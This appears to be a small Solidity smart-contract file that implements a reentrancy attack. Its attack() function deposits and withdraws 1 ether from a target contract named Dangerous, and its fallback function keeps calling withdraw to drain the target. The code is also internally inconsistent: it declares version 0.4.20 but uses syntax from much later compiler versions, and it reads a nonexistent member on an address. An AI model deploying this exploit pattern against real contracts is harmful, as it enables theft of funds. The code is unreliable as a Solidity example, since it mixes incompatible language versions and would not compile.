pragma solidity 0.4.20;

contract Attack{
    Dangerous public dangerous;

    constructor(address _dangerousAddress) public{
        dangerous = Dangerous(_dangerousAddress);
    }

    fallback() external payable {
        if (address(dangerous).deposits >= 1 ether) {
            dangerous.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        dangerous.deposit{value: 1 ether}();
        dangerous.withdraw(1 ether);
    }

}
